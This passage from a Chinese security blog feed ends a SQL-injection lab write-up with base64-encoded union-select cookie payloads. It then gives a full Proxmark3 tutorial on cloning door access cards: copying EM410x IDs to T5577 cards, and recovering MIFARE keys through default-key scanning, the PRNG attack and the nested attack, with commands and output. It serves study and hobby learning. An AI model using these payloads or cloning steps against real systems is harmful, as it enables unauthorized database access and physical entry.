uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw<span class="hljs-number">%3</span>D<span class="hljs-number">%3</span>D</code></pre></p><p><img src="/img/2018-08-03/21.png" srcset="/img/static/loading.gif" alt="21"></p><h5 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h5><p>和第二十一关一样，单引号变双引号<br><pre><code class="hljs undefined">YWRtaW<span class="hljs-number">4</span>iIHVuaW<span class="hljs-number">9</span>uIH<span class="hljs-symbol">NlbGVjdCAxLDIsZGF0</span>YWJhc<span class="hljs-number">2</span>UoKSBsaW<span class="hljs-number">1</span>pdCAxLDEj</code></pre></p><p>第一部分</p><p>完、</p>]]></content>
    
    
    
    <tags>
      
      <tag>注入</tag>
      
      <tag>web</tag>
      
      <tag>盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Proxmark3 Easy破解门禁卡学习过程</title>
    <link href="/2018/07/26/proxmark3/"/>
    <url>/2018/07/26/proxmark3/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。<strong>真正有问题的不是安全，而是人心。</strong>很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。<br><a id="more"></a></p><h4 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h4><h5 id="破解设备"><a href="#破解设备" class="headerlink" title="破解设备"></a>破解设备</h5><p>Proxmark3 Easy<br><img src="/img/2018-07-26/Proxmark3.jpg" srcset="/img/static/loading.gif" alt="Proxmark3 Easy"><br>破解工具不一定是Proxmark3 Easy，只要是还能够获取和修改卡片数据的设备都可以，比如arc122u，arc122u只能读取和修改高频卡，有点不足<br><img src="/img/2018-07-26/arc122u.jpg" srcset="/img/static/loading.gif" alt="arc122u"></p><h5 id="各种卡"><a href="#各种卡" class="headerlink" title="各种卡"></a>各种卡</h5><p>准备一些ID，IC卡<br><img src="/img/2018-07-26/ka.jpg" srcset="/img/static/loading.gif" alt="ka"><br>这不都长一个样么（＃－.－）</p><h5 id="区分ID卡和IC卡的方法"><a href="#区分ID卡和IC卡的方法" class="headerlink" title="区分ID卡和IC卡的方法"></a>区分ID卡和IC卡的方法</h5><ol><li>光照法<br><img src="/img/2018-07-26/1.jpg" srcset="/img/static/loading.gif" alt="1"><br><img src="/img/2018-07-26/2.jpg" srcset="/img/static/loading.gif" alt="2"><br>圆形大多是ID卡，方形大多是IC卡</li><li>NFC法<br>拿一部带有NFC功能的手机打开NFC，卡片靠近手机会响的是IC卡，不会响的是ID卡</li></ol><h4 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h4><p>&emsp;&emsp;首先，门禁卡所用到的技术是RFID，具体详情可以看这里–&gt;<a href="https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139?fromtitle=RFID&amp;fromid=497249" target="_blank" rel="noopener">传送门</a>，首先从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。常见的卡的有</p><style>table th:first-of-type {      width: 25%; }table th:nth-of-type(2) {      width: 7%; }table th:nth-of-type(3) {      width: 68%; }</style><table><thead><tr><th>类型</th><th style="text-align:center">频率</th><th>特性</th></tr></thead><tbody><tr><td>Mifare S50(简称M1)</td><td style="text-align:center">高频</td><td>最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡</td></tr><tr><td>Mifare UltraLight（简称M0）</td><td style="text-align:center">高频</td><td>低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡</td></tr><tr><td>Mifare UID（简称UID卡）</td><td style="text-align:center">高频</td><td>M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据</td></tr><tr><td>EM4XX（简称ID卡）</td><td style="text-align:center">低频</td><td>常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡）</td></tr><tr><td>T5577（简称可修改ID卡）</td><td style="text-align:center">低频</td><td>可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码</td></tr><tr><td>HID ProxⅡ（简称HID卡）</td><td style="text-align:center">低频</td><td>美国常用的低频卡，可擦写，不与其他卡通用</td></tr></tbody></table><h5 id="高频"><a href="#高频" class="headerlink" title="高频"></a>高频</h5><h6 id="M1-S50卡"><a href="#M1-S50卡" class="headerlink" title="M1 S50卡"></a>M1 S50卡</h6><p>&emsp;&emsp;目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。<strong>每个扇区都有独立的一组密码及访问控制</strong>，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B<br>每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。<br><pre><code class="hljs undefined">扇区<span class="hljs-number">0</span><span class="hljs-number">03332801198804008500</span>b42ef0bb6aa8 块<span class="hljs-number">0</span> <span class="hljs-comment">//厂商代码，不可更改</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">1</span> <span class="hljs-comment">//数据块</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">2</span> <span class="hljs-comment">//数据块</span>ffffffffffffff078069ffffffffffff 块<span class="hljs-number">3</span> <span class="hljs-comment">//密码A（6字节），存储控制（4字节），密码B（6字节）</span>扇区<span class="hljs-number">1</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">4</span> <span class="hljs-comment">//出了第0扇区稍有不同，其他15个扇区结构完全一样</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">5</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">6</span>ffffffffffffff078069ffffffffffff 块<span class="hljs-number">7</span>        .        .        .   扇区<span class="hljs-number">15</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">60</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">61</span><span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">62</span>ffffffffffffff078069ffffffffffff 块<span class="hljs-number">63</span></code></pre></p><p>&emsp;&emsp;中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。<strong>密码不一定可以读取，由控制字决定。</strong></p><h6 id="M1-UID卡"><a href="#M1-UID卡" class="headerlink" title="M1 UID卡"></a>M1 UID卡</h6><p>&emsp;&emsp;M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。</p><h6 id="FUID卡"><a href="#FUID卡" class="headerlink" title="FUID卡"></a>FUID卡</h6><p>&emsp;&emsp;FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。<strong>FUID可以修改0块，但只可以修改一次</strong>，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。</p><h6 id="CUID卡"><a href="#CUID卡" class="headerlink" title="CUID卡"></a>CUID卡</h6><p>&emsp;&emsp;CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过<strong>指令</strong>修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。</p><h5 id="低频"><a href="#低频" class="headerlink" title="低频"></a>低频</h5><h6 id="ID卡"><a href="#ID卡" class="headerlink" title="ID卡"></a>ID卡</h6><p>&emsp;&emsp;ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。</p><h6 id="T5577卡"><a href="#T5577卡" class="headerlink" title="T5577卡"></a>T5577卡</h6><p>&emsp;&emsp;T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下<br><pre><code class="hljs undefined"><span class="hljs-number">0x00148040</span>  <span class="hljs-number">00000000000101001000000001000000</span> [<span class="hljs-number">0</span>]<span class="hljs-number">0xFF94C004</span>  <span class="hljs-number">11111111100101001100000000000100</span> [<span class="hljs-number">1</span>]<span class="hljs-number">0xA5464942</span>  <span class="hljs-number">10100101010001100100100101000010</span> [<span class="hljs-number">2</span>]<span class="hljs-number">0xFFFFF808</span>  <span class="hljs-number">11111111111111111111100000001000</span> [<span class="hljs-number">3</span>]<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">4</span>]<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">5</span>]<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">6</span>]<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">7</span>]</code></pre></p><h4 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h4><h5 id="破解ID卡"><a href="#破解ID卡" class="headerlink" title="破解ID卡"></a>破解ID卡</h5><h6 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h6><p>驱动下载官网网址–&gt;<a href="https://store.ryscc.com/blogs/news/how-to-install-a-proxmark3-driver-on-windows-10" target="_blank" rel="noopener">传送门</a><br>安装驱动文件前需要禁用<strong>驱动安装强制签名</strong>，方法–&gt;<a href="https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html" target="_blank" rel="noopener">传送门</a><br>驱动安装方法<br><strong>我的电脑右键–&gt;管理–&gt;设备管理器–&gt;端口下的设备右键–&gt;更新驱动程序–&gt;浏览我的计算机–&gt;选择本地–&gt;从磁盘安装–找到官方的驱动文件–&gt;确认</strong><br>驱动安装完成会显示图片上的样子，记住<strong>COM端口</strong><br><img src="/img/2018-07-26/4.png" srcset="/img/static/loading.gif" alt="4"></p><h6 id="硬件使用方法"><a href="#硬件使用方法" class="headerlink" title="硬件使用方法"></a>硬件使用方法</h6><p><strong>Proxmark3 Easy</strong><br><img src="/img/2018-07-26/3.jpg" srcset="/img/static/loading.gif" alt="3"></p><pre><code>1 功能按钮2 ABCD工作状态指示灯3 USB接口4 电源指示灯5 低频读卡区6 高频读卡区</code></pre><p>&emsp;&emsp;功能按钮有<code>退出</code>、<code>取消</code>、<code>停止</code>、<code>强刷固件</code>的功能，ABCD指示灯作为设备运行的依据，闪烁说明正在进行，完全熄灭或者常亮代表攻击失败、等待。全部熄灭表示已经停止运行了，直接重新拔插设备。</p><h6 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h6><p><strong>读卡片ID号→换上T5577卡→把ID号写入卡片→完成</strong><br>ID是没有密码只有卡号的，因此只要知道卡号就可以复制。<br>软件资料包–&gt;<a href="https://pan.baidu.com/s/1feD3GKEaLw8jVTOGs5N40w" target="_blank" rel="noopener">密码: f8q4</a><br>打开<code>官方软件固件\pm3-bin-2.5.0\win32(client+GUI)\Proxmark Tool.exe</code>，箭头所指选择刚刚驱动安装的那个<code>COM端口</code>，连接Proxmark3，接入电脑后，电源指示灯处<code>POW</code>亮蓝灯，<code>FULL</code>亮绿灯，<code>CHR</code>闪烁微弱红灯。<br><img src="/img/2018-07-26/5.png" srcset="/img/static/loading.gif" alt="5"><br>在<code>COMMAND TO SEND</code>里输入<code>hw tune</code>测试天线谐振电压，高频超过5V，低频超过10V就可以正常使用。<br><pre><code class="hljs undefined"><span class="hljs-meta">proxmark3&gt;</span><span class="bash"> hw tune</span>Measuring antenna characteristics, please wait........          <span class="hljs-meta">#</span><span class="bash"> LF antenna: 22.27 V @   125.00 kHz          </span><span class="hljs-meta">#</span><span class="bash"> LF antenna: 31.76 V @   134.00 kHz          </span><span class="hljs-meta">#</span><span class="bash"> LF optimal: 31.76 V @   133.33 kHz          </span><span class="hljs-meta">#</span><span class="bash"> HF antenna: 20.17 V @    13.56 MHz          </span>Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</code></pre></p><p>把低频ID卡（门禁卡）放到低频读卡区输入<code>lf search</code>获取ID卡的信息，把卡号抄下来，复制时要用<br><pre><code class="hljs undefined">proxmark3&gt; lf searchReading <span class="hljs-number">30000</span> bytes from device memoryData fetched          Samples @ <span class="hljs-number">8</span> bits/smpl, decimation <span class="hljs-number">1</span>:<span class="hljs-number">1</span>           NOTE: <span class="hljs-keyword">some</span> demods output possible binary  <span class="hljs-keyword">if</span> it finds something that looks like a tag          <span class="hljs-literal">False</span> Positives ARE possibleChecking <span class="hljs-keyword">for</span> known tags:EM410x pattern found:           EM TAG ID      : 0000001450         //<span class="hljs-type">ID</span>卡号，这个抄下来，如果是HID卡会显示HIDUnique TAG ID  : 000000280<span class="hljs-type">A</span>          Possible de-scramble patterns          HoneyWell IdentKey &#123;          DEZ <span class="hljs-number">8</span>          : 00005200          DEZ <span class="hljs-number">10</span>         : 0000005200          DEZ <span class="hljs-number">5.5</span>        : 00000.05200          DEZ <span class="hljs-number">3.5</span>A       : 000.05200          DEZ <span class="hljs-number">3.5</span>B       : 000.05200          DEZ <span class="hljs-number">3.5</span>C       : 000.05200          DEZ <span class="hljs-number">14</span>/IK2     : 00000000005200          DEZ <span class="hljs-number">15</span>/IK3     : 000000000010250          DEZ <span class="hljs-number">20</span>/ZK      : 00000000000002080010          &#125;Other          : 05200_000_00005200          Pattern Paxton : 1331792 [0<span class="hljs-type">x145250</span>]          Pattern <span class="hljs-number">1</span>      : 16652 [0<span class="hljs-type">x410C</span>]          Pattern Sebury : 5200 0 5200  [0<span class="hljs-type">x1450</span> <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x1450]          Valid EM410x ID Found! //卡的类型</code></pre></p><p>把T5577卡放到低频读卡区，输入命令<code>lf hid clone 0000001450</code><br><pre><code class="hljs undefined"><span class="hljs-meta">proxmark3&gt;</span><span class="bash"> lf hid <span class="hljs-built_in">clone</span> 0000001450 </span>Cloning tag with ID 000001450          <span class="hljs-meta">proxmark3&gt;</span><span class="bash"> </span><span class="hljs-meta">proxmark3&gt;</span><span class="bash"> <span class="hljs-comment">#db# DONE!</span></span></code></pre></p><p>上述命令在左上方的命令树中都可以找到，左边有一些按钮和命令的介绍<br><img src="/img/2018-07-26/6.png" srcset="/img/static/loading.gif" alt="6"><br>ID卡复制就完成了<br>效果如下<br><img src="/img/2018-07-26/11.jpg" srcset="/img/static/loading.gif" alt="11"></p><h5 id="破解IC卡"><a href="#破解IC卡" class="headerlink" title="破解IC卡"></a>破解IC卡</h5><h6 id="IC卡破解思路"><a href="#IC卡破解思路" class="headerlink" title="IC卡破解思路"></a>IC卡破解思路</h6><p><strong>获取任意扇区的密钥</strong></p><ul><li><strong>PRNG 漏洞攻击得 0 扇区密匙</strong></li><li><strong>默认密码扫描获得密匙</strong></li><li><strong>嗅探读卡机和卡片交互数据获得密匙</strong></li><li><strong>模拟成 M1 卡刷卡后捕获密匙（挑读卡机，兼容性不好）</strong></li></ul><p>↓<br><strong>利用MFOC漏洞用已知扇区密钥求所有扇区密钥</strong><br>↓<br><strong>用破解出的密匙把卡片数据读出导入电脑</strong><br>↓<br><strong>把电脑中的数据写入UID卡中</strong><br>&emsp;&emsp;第一步是最重要也是最难的一步，很多IC卡往往都是难以攻破0扇区的密钥而无法进行下一步。默认密码扫描看运气，PRNG漏洞攻击概率低，后面两个虽然概率高但是成本高且实施比较困难。<br>&emsp;&emsp;上面的<code>Proxmark Tool</code>是官方英文版GUI，还有国内中文版GUI（Proxmark3_EASY_GUI），中文版的GUI比较简单，不用记很多命令，原生态<code>PM3指令台</code>就是纯命令行模式，看起来也比较有逼格点。一开始我是根据资料用英文版的GUI，感觉不怎么好用，后来用了原生态后觉得原生态的好用多了，但是要记命令，命令忘记了就用中文GUI查命令ㄟ( ▔, ▔ )ㄏ。<code>can&#39;t slect card</code>这个bug也是在用了原生态之后才知道的。<br><strong>PRNG漏洞获取0扇区密钥，486固件不掉线外，630之后的固件，有些卡可以破，有卡些会掉线并出现can’t slect card</strong><br><img src="/img/2018-07-26/7.png" srcset="/img/static/loading.gif" alt="7"></p><h6 id="获取0扇区密钥"><a href="#获取0扇区密钥" class="headerlink" title="获取0扇区密钥"></a>获取0扇区密钥</h6><p>扯远了，默认密码扫描<code>hf mf chk *1 ? t</code><br><pre><code class="hljs undefined">proxmark3&gt; hf mf chk <span class="hljs-number">*1</span> ? t<span class="hljs-literal">No</span> key specified, trying<span class="hljs-built_in"> default </span>keyschk<span class="hljs-built_in"> default </span>key[ 0] ffffffffffffchk<span class="hljs-built_in"> default </span>key[ 1] 000000000000chk<span class="hljs-built_in"> default </span>key[ 2] a0a1a2a3a4a5chk<span class="hljs-built_in"> default </span>key[ 3] b0b1b2b3b4b5chk<span class="hljs-built_in"> default </span>key[ 4] aabbccddeeffchk<span class="hljs-built_in"> default </span>key[ 5] 4d3a99c351ddchk<span class="hljs-built_in"> default </span>key[ 6] 1a982c7e459achk<span class="hljs-built_in"> default </span>key[ 7] d3f7d3f7d3f7chk<span class="hljs-built_in"> default </span>key[ 8] 714c5c886e97chk<span class="hljs-built_in"> default </span>key[ 9] 587ee5f9350fchk<span class="hljs-built_in"> default </span>key[10] a0478cc39091chk<span class="hljs-built_in"> default </span>key[11] 533cb6c723f6chk<span class="hljs-built_in"> default </span>key[12] 8fd0a4f256e9--sector: 0, block:  3, key type:A, key count:13...--sector:15, block: 63, key type:B, key count:13Found valid key:[ffffffffffff]Found keys have been transferred <span class="hljs-keyword">to</span> the emulator memory</code></pre></p><p>密码是默认密码的时候可以扫的出来，不是默认密码可以尝试PRNG漏洞获取0扇区密钥<code>hf mf mifare</code><br><pre><code class="hljs undefined">proxmark3&gt;hf mf mifare...uid(ea117dee) nt(431c39b0) par(0000000000000000) ks(030702000a030209) nr(800000005)|<span class="hljs-string">diff</span>|<span class="hljs-string">&#123;nr&#125;    </span>|<span class="hljs-string">ks3</span>|<span class="hljs-string">ks3^5</span>|<span class="hljs-string">parity         </span>|+----+--------+---+-----+---------------+|<span class="hljs-string"> 00 </span>|<span class="hljs-string">00000005</span>|<span class="hljs-string"> 3 </span>|<span class="hljs-string">  6  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>||<span class="hljs-string"> 20 </span>|<span class="hljs-string">00000025</span>|<span class="hljs-string"> 7 </span>|<span class="hljs-string">  2  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>||<span class="hljs-string"> 40 </span>|<span class="hljs-string">00000045</span>|<span class="hljs-string"> 2 </span>|<span class="hljs-string">  7  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>||<span class="hljs-string"> 60 </span>|<span class="hljs-string">00000065</span>|<span class="hljs-string"> 0 </span>|<span class="hljs-string">  5  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>||<span class="hljs-string"> 80 </span>|<span class="hljs-string">00000085</span>|<span class="hljs-string"> a </span>|<span class="hljs-string">  f  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>||<span class="hljs-string"> a0 </span>|<span class="hljs-string">000000a5</span>|<span class="hljs-string"> 3 </span>|<span class="hljs-string">  6  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>||<span class="hljs-string"> c0 </span>|<span class="hljs-string">000000c5</span>|<span class="hljs-string"> 2 </span>|<span class="hljs-string">  7  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>||<span class="hljs-string"> e0 </span>|<span class="hljs-string">000000e5</span>|<span class="hljs-string"> 9 </span>|<span class="hljs-string">  c  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|parity is all zero,try special attack!just wait for few more seconds...         p1:0 p2:0 p3:0 key:ffffffffffffp1:58b87 p2:61ec p3:1 key:b4c98bd73e94p1:c6a1b p2:d983 p3:2 key:576efc88ccc7p1:ef844 p2:106dd p3:3 key:34ed3c6092e9p1:f7e1e p2:10fd7 p3:4 key:2de06659d60ep1:1239c0 p2:13fa0 p3:5 key:08b7558601a1p1:12d1b3 p2:149c9 p3:6 key:00adbba1e330key_count:7------------------------------------------------------------------Key found:ffffffffffffFound valid key:ffffffffffff</code></pre></p><p>因为设备是<del>我</del>小姐姐的，固件是630之后的，所以会出现很多<code>#db# Mifare: Can&#39;t select card</code>,就放不了全部代码，查看固件命令<code>hw version</code><br><pre><code class="hljs undefined"><span class="hljs-selector-tag">proxmark3</span>&gt; <span class="hljs-selector-tag">hw</span> <span class="hljs-selector-tag">version</span><span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">Prox</span>/<span class="hljs-selector-tag">RFID</span> <span class="hljs-selector-tag">mark3</span> <span class="hljs-selector-tag">RFID</span> <span class="hljs-selector-tag">instrument</span><span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">bootrom</span>: /<span class="hljs-selector-tag">-suspect</span> <span class="hljs-selector-tag">2016-11-09</span> <span class="hljs-selector-tag">00</span><span class="hljs-selector-pseudo">:59</span><span class="hljs-selector-pseudo">:56</span><span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">os</span>: /<span class="hljs-selector-tag">-suspect</span> <span class="hljs-selector-tag">2016-12-08</span> <span class="hljs-selector-tag">12</span><span class="hljs-selector-pseudo">:45</span><span class="hljs-selector-pseudo">:38</span><span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">HF</span> <span class="hljs-selector-tag">FPGA</span> <span class="hljs-selector-tag">image</span> <span class="hljs-selector-tag">built</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">2015</span>/<span class="hljs-selector-tag">03</span>/<span class="hljs-selector-tag">09</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">08</span><span class="hljs-selector-pseudo">:41</span><span class="hljs-selector-pseudo">:42</span><span class="hljs-selector-id">#db</span>#   <span class="hljs-selector-tag">Modify</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">Willok</span>(willok<span class="hljs-variable">@163</span>.com)<span class="hljs-selector-id">#db</span>#      <span class="hljs-selector-tag">proxmark3</span><span class="hljs-selector-class">.taobao</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">uC</span>: <span class="hljs-selector-tag">AT91SAM7S256</span> <span class="hljs-selector-tag">Rev</span> <span class="hljs-selector-tag">B</span><span class="hljs-selector-tag">Embedded</span> <span class="hljs-selector-tag">Processor</span>: <span class="hljs-selector-tag">ARM7TDMI</span><span class="hljs-selector-tag">Nonvolatile</span> <span class="hljs-selector-tag">Program</span> <span class="hljs-selector-tag">Memory</span> <span class="hljs-selector-tag">Size</span>: <span class="hljs-selector-tag">256K</span> <span class="hljs-selector-tag">bytes</span><span class="hljs-selector-tag">Second</span> <span class="hljs-selector-tag">Nonvolatile</span> <span class="hljs-selector-tag">Program</span> <span class="hljs-selector-tag">Memory</span> <span class="hljs-selector-tag">Size</span>: <span class="hljs-selector-tag">None</span><span class="hljs-selector-tag">Internal</span> <span class="hljs-selector-tag">SRAM</span> <span class="hljs-selector-tag">Size</span>: <span class="hljs-selector-tag">64K</span> <span class="hljs-selector-tag">bytes</span><span class="hljs-selector-tag">Architecture</span> <span class="hljs-selector-tag">Identifier</span>: <span class="hljs-selector-tag">AT91SAM7Sxx</span> <span class="hljs-selector-tag">Series</span><span class="hljs-selector-tag">Nonvolatile</span> <span class="hljs-selector-tag">Program</span> <span class="hljs-selector-tag">Memory</span> <span class="hljs-selector-tag">Type</span>: <span class="hljs-selector-tag">Embedded</span> <span class="hljs-selector-tag">Flash</span> <span class="hljs-selector-tag">Memory</span></code></pre></p><p><strong>Tip:固件版本是根据固件的日期来看的</strong><br>我们可以测试一下我们拿到的密钥对不对，错误不会返回最下面那一行<br><pre><code class="hljs undefined">proxmark3&gt; hf mf chk <span class="hljs-number">0</span> A ffffffffffffchk <span class="hljs-built_in">key</span>[ <span class="hljs-number">0</span>] ffffffffffff--sector: <span class="hljs-number">0</span>, block:  <span class="hljs-number">0</span>, <span class="hljs-built_in">key</span> <span class="hljs-built_in">type</span>:A, <span class="hljs-built_in">key</span> <span class="hljs-built_in">count</span>: <span class="hljs-number">1</span>Found valid <span class="hljs-built_in">key</span>:[ffffffffffff]</code></pre></p><h6 id="知一求十五"><a href="#知一求十五" class="headerlink" title="知一求十五"></a>知一求十五</h6><p>获取到0扇区的密钥后我们就可以通过MFOC漏洞获取所有扇区的密钥（100%成功）<br><pre><code class="hljs undefined">proxmark3&gt; hf mf nested 1 0 A ffffffffffff //0是0扇区，A密钥Testing known keys. Sector count=16nested...Time in nested: 4.330 (inf sec per key)-----------------------------------------------Iterations count: 0|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>||<span class="hljs-string">sec</span>|<span class="hljs-string">key A           </span>|<span class="hljs-string">res</span>|<span class="hljs-string">key B           </span>|<span class="hljs-string">res</span>||<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>||<span class="hljs-string">000</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">001</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">002</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">003</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">004</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">005</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">006</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">007</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">008</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">009</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">010</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">011</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">012</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">013</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">014</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">015</span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string">  ffffffffffff  </span>|<span class="hljs-string"> 1 </span>||<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|</code></pre></p><p>接下来导出密钥<br><pre><code class="hljs undefined">proxmark3&gt; hf mf nested 1 0 A ffffffffffff dTesting known keys. Sector count=16nested...Time in nested: 4.302 (inf sec per key)-----------------------------------------------Iterations count: 0|<span class="hljs-string">---</span>|<span class="hljs-string">----------------</span>|<span class="hljs-string">---</span>|<span 